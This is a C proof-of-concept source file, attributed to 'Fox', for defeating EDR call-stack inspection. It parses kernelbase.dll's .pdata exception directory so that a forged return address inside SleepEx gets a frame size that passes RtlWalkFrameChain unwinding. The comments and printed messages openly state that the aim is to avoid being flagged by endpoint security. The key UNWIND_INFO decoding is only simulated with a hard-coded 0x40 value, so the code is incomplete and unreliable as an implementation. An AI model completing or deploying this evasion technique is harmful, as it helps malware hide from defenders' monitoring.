#include <windows.h>
#include <winnt.h>
#include <stdio.h>

// Fox's Exception Directory (.pdata) Spoofing PoC
//
// The Reality:
// Basic return address spoofing (just pushing a fake RIP to the stack) fails against 
// modern EDRs because they use RtlWalkFrameChain or similar APIs to unwind the stack.
// If the stack pointer (RSP) doesn't match the expected frame size defined in the 
// module's Exception Directory (.pdata), the stack is flagged as anomalous.
//
// The Solution:
// We must parse the .pdata section of a legitimate module (e.g., kernelbase.dll), 
// find a valid RUNTIME_FUNCTION entry, decode its UNWIND_INFO to determine the exact 
// stack frame size it allocates, and then adjust our fake RSP by that exact amount 
// before pushing the fake return address. This creates a mathematically perfect 
// stack frame that passes unwind checks.

// Helper to get the DOS header
PIMAGE_DOS_HEADER GetDosHeader(HMODULE hModule) {
    return (PIMAGE_DOS_HEADER)hModule;
}

// Helper to get the NT headers
PIMAGE_NT_HEADERS GetNtHeaders(HMODULE hModule) {
    PIMAGE_DOS_HEADER pDosHeader = GetDosHeader(hModule);
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    return (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDosHeader->e_lfanew);
}

// Fox's .pdata parser to find a valid frame size for a given return address
DWORD CalculateRequiredFrameSize(HMODULE hModule, DWORD_PTR targetRva) {
    PIMAGE_NT_HEADERS pNtHeaders = GetNtHeaders(hModule);
    if (!pNtHeaders) return 0;

    // Locate the Exception Directory (.pdata)
    DWORD pdataRva = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD pdataSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    
    if (pdataRva == 0 || pdataSize == 0) {
        printf("[-] Module has no Exception Directory.\n");
        return 0;
    }

    PRUNTIME_FUNCTION pRuntimeFunction = (PRUNTIME_FUNCTION)((PBYTE)hModule + pdataRva);
    DWORD numEntries = pdataSize / sizeof(RUNTIME_FUNCTION);

    // Binary search or linear scan to find the RUNTIME_FUNCTION covering our targetRva
    // For PoC, we do a simple linear scan.
    for (DWORD i = 0; i < numEntries; i++) {
        if (targetRva >= pRuntimeFunction[i].BeginAddress && targetRva < pRuntimeFunction[i].EndAddress) {
            printf("[+] Found RUNTIME_FUNCTION for RVA 0x%llX\n", targetRva);
            
            // The UnwindData field contains the RVA to the UNWIND_INFO structure
            DWORD unwindInfoRva = pRuntimeFunction[i].UnwindData;
            
            // Note: UNWIND_INFO parsing is complex because it contains variable-length arrays
            // of UNWIND_CODE structures that describe exactly how the prologue allocates 
            // stack space (e.g., UWOP_ALLOC_SMALL, UWOP_ALLOC_LARGE).
            // 
            // A full implementation must decode these codes to calculate the total frame size.
            // For this conceptual PoC, we simulate the calculation.
            
            printf("[+] Parsing UNWIND_INFO at RVA 0x%X...\n", unwindInfoRva);
            
            // Simulated calculation: Let's pretend the unwind codes dictate a 0x40 byte frame
            DWORD calculatedFrameSize = 0x40; 
            
            printf("[+] Calculated required stack frame size: 0x%X bytes\n", calculatedFrameSize);
            return calculatedFrameSize;
        }
    }

    printf("[-] Target RVA not found in Exception Directory.\n");
    return 0;
}

int main() {
    printf("[+] Starting .pdata Spoofing PoC.\n");

    HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
    if (!hKernelBase) return -1;

    // Let's say we want to spoof a return address inside SleepEx
    PVOID pSleepEx = GetProcAddress(hKernelBase, "SleepEx");
    if (!pSleepEx) return -1;

    // We pick an offset inside SleepEx to act as our fake return address
    // (In reality, you'd look for a specific instruction like 'ADD RSP, X; RET')
    DWORD_PTR targetRva = (DWORD_PTR)pSleepEx - (DWORD_PTR)hKernelBase + 0x20; 
    
    printf("[+] Target Fake Return Address: kernelbase.dll + 0x%llX\n", targetRva);

    // Calculate how much stack space we need to allocate to make this frame look legitimate
    DWORD frameSize = CalculateRequiredFrameSize(hKernelBase, targetRva);

    if (frameSize > 0) {
        printf("[!] To spoof this frame, you MUST subtract 0x%X from RSP before pushing the return address.\n", frameSize);
        printf("[!] If you don't, RtlWalkFrameChain will fail and the EDR will flag the thread.\n");
    }

    return 0;
}